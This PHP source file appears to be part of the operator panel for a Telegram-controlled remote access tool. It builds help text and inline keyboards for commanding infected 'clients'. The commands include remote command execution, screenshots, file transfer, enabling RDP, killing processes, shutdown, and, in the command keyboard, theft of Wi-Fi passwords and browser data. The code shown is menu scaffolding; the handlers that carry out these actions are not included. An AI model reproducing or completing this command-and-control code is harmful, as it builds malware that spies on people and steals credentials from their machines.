<?php
class LoggerBot
{

    private function sendHelpMessage($recipient, $isClient = false)
    {
        $message = "Available commands:\n" .
            "/start - Show client list\n" .
            "/select <client_id> - Select a client\n" .
            "/status - Check system status\n" .
            "/screenshot - Take screenshot\n" .
            "/exec <command> - Execute command\n" .
            "/hosts - View hosts file\n" .
            "/browse <path> - Browse directory\n" .
            "/browse_recursive <path> - Recursive directory listing\n" .
            "/get-info - System info\n" .
            "/go <url> - Open URL\n" .
            "/shutdown - Shutdown system\n" .
            "/upload <file_path> - Upload file\n" .
            "/upload_url <file_url> - Upload from URL\n" .
            "/tasks - List running tasks\n" .
            "/end_task <process_name> - End a process\n" .
            "/enable_rdp - Enable RDP\n" .
            "/disable_rdp - Disable RDP\n" .
            "/signout - Sign out\n" .
            "/sleep - Sleep system\n" .
            "/restart - Restart system\n" .
            "/logs - View server logs\n" .
            "/screens - List screenshots\n" .
            "/test_telegram - Test Telegram API\n" .
            "/listusers - List active users\n" .
            "/addadmin <user_id> - Add admin";
        if ($isClient) {
            return $message;
        }
        $this->sendTelegramMessage($recipient, $message);
        return $message;
    }

    private function sendClientKeyboard($chatId)
    {
        $clients = $this->getClientStatus();
        $this->logWebhook("Fetched clients for keyboard: " . json_encode($clients));

        if (empty($clients)) {
            $this->sendTelegramMessage($chatId, "No clients registered. Please ensure clients are connected. Use /select <client_id> to select directly.");
            $this->logError("No clients found for keyboard, chat_id: $chatId");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($clients as $client) {
            $status = $client['is_online'] ? '🟢' : '🔴';
            $ip = $client['ip_address'] ?? 'Unknown';
            $row[] = [
                'text' => "$status {$client['client_id']} ($ip)",
                'callback_data' => "select_client:{$client['client_id']}"
            ];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logWebhook("Sending client keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
        $response = $this->sendTelegramMessage($chatId, "Select a client:", ['reply_markup' => $keyboard]);
        $this->logWebhook("Telegram API response for keyboard: " . $response);
    }

    private function sendCommandKeyboard($chatId, $message)
    {
        $commands = [
            '/status' => 'System Status',
            '/screenshot' => 'Take Screenshot',
            '/upload' => 'Upload File',
            '/exec' => 'Execute Command',
            '/logs' => 'View Logs',
            '/hosts' => 'View Hosts',
            '/screens' => 'List Screenshots',
            '/browse' => 'Browse Directory',
            '/get-info' => 'System Info',
            '/go' => 'Open URL',
            '/shutdown' => 'Shutdown',
            '/test_telegram' => 'Test Telegram',
            '/upload_file' => 'Upload File',
            '/upload_url' => 'Upload from URL',
            '/tasks' => 'List Tasks',
            '/startup' => 'Manage Startup',
            '/signout' => 'Sign Out',
            '/sleep' => 'Sleep',
            '/restart' => 'Restart',
            '/listusers' => 'List Users',
            '/addadmin' => 'Add Admin',
            '/end_task' => 'End Task',
            '/enable_rdp' => 'Enable RDP',
            '/disable_rdp' => 'Disable RDP',
            '/getwifipasswords' => 'Get Wi-Fi Passwords',
            '/get_browser_data' => 'Get Browser Data',
            '/select' => 'Select Client'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        $this->logWebhook("Sending command keyboard to chat_id: $chatId, keyboard: " . json_encode($keyboard));
        $this->sendTelegramMessage($chatId, $message, ['reply_markup' => $keyboard]);
    }
}
